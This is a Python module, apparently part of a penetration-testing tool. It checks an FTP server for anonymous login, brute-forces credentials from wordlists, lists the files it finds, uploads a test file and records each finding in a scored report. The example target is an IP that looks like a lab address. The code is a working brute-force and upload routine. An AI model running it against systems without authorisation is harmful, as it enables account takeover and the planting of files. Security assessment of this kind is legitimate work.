import ftplib
import os
from  colorama import Fore
from Report import GenerateReport

def ftp_bruteforce(host, rp, default_users_file, default_passwords_file):
    user_file = "enum/users.txt" if os.path.exists("enum/users.txt") else default_users_file
    pass_file = "enum/password.txt" if os.path.exists("enum/password.txt") else default_passwords_file

    with open(user_file, 'r') as users, open(pass_file, 'r') as passwords:
        for user in users:
            user = user.strip()
            print(f"Trying user {user}")
            passwords.seek(0)
            for password in passwords:
                password = password.strip()
                try:
                    ftp = ftplib.FTP(host)
                    print(f"user: {user}")
                    print(f"pass: {password}")
                    ftp.login(user, password)
                    print(f"{Fore.GREEN}[+] Found credentials: {user}:{password}{Fore.WHITE}")
                    rp.append_report("FTP", "Found Credentials", 3, "Using Bruteforce", f"Check the permissions of {user}:{password} for other services")
                    check_files(ftp,rp)
                    upload_file(ftp,rp)
                    ftp.quit()
                    return f'{user}:{password}'
                except ftplib.error_perm:
                    pass
    rp.append_report("FTP", "Found Credentials", 0, "can't find using Bruteforce", "-")
    print(f"{Fore.RED}[-] Could not find valid credentials.{Fore.WHITE}")
    return None, None

def check_anonymous_login(host, rp):
    try:      
        ftp = ftplib.FTP(host)
        ftp.set_pasv(False)  # Set active mode
        ftp.login()  # Attempt anonymous login
        print(f"{Fore.GREEN}[+] Anonymous login is allowed on {host} {Fore.WHITE}")
        rp.append_report("FTP", "Anonymous Login", 1, "Allowed", "You can leave it")
        check_files(ftp, rp)
        upload_file(ftp, rp)
        ftp.quit()
        return True
    except ftplib.error_perm:
        print(f"{Fore.RED}[-] Anonymous login is not allowed on {host} {Fore.WHITE}")
        rp.append_report("FTP", "Anonymous Login", 0, "Not Allowed", "-")
        print(f"{Fore.BLUE}Trying to brute force the username and password {Fore.WHITE}")
        ftp_bruteforce(host, rp, "/defult_cred/ftp/users", "/defult_cred/ftp/passwords")
        return None

def upload_file(ftp, rp, local_file="test.txt"):
    try:
        print(f"{Fore.BLUE}Trying to upload file {Fore.WHITE}")
        # Get the current working directory
        current_directory = ftp.pwd()
        # Open the local file in binary mode
        with open(local_file, 'rb') as file:
            # Upload the file to the remote server
            ftp.storbinary('STOR ' + os.path.basename(local_file), file)
        print(f"{Fore.GREEN}[+] File uploaded successfully.{Fore.WHITE}")
        rp.append_report("FTP", "Upload Files", 8, "Allowed", "Malicious files can be uploaded")
    except ftplib.error_perm as e:
        rp.append_report("FTP", "Upload Files", 0, "Not Allowed", "-")
        print(f"{Fore.RED}[-] Error:", e, f"{Fore.WHITE}")

def check_files(ftp, rp):
    try: 
        print(f"{Fore.BLUE}Trying to find files on this user directory {Fore.WHITE}")       
        files = ftp.nlst() # Get a list of files and directories

        # Check if there are any files or directories
        if files:
            print(f"{Fore.GREEN}Files/Directories found on the server:{Fore.WHITE}")
            rp.append_report("FTP", "List Files", 6, "Allowed", "Maybe there are credentials in these files")
            for file in files:
                print(file)
        else:
            rp.append_report("FTP", "List Files", 0, "Not Allowed", "-")
            print(f"{Fore.RED}[-] No files/directories found on the server.{Fore.WHITE}")
    except ftplib.error_perm as e:
        print("Error:", e)

if  __name__ == "__main__":
    # Usage example
    host = '10.10.11.247'
    user_file = "users"
    pass_file = "passwords"
    rp = GenerateReport()
    check_anonymous_login(host,rp)
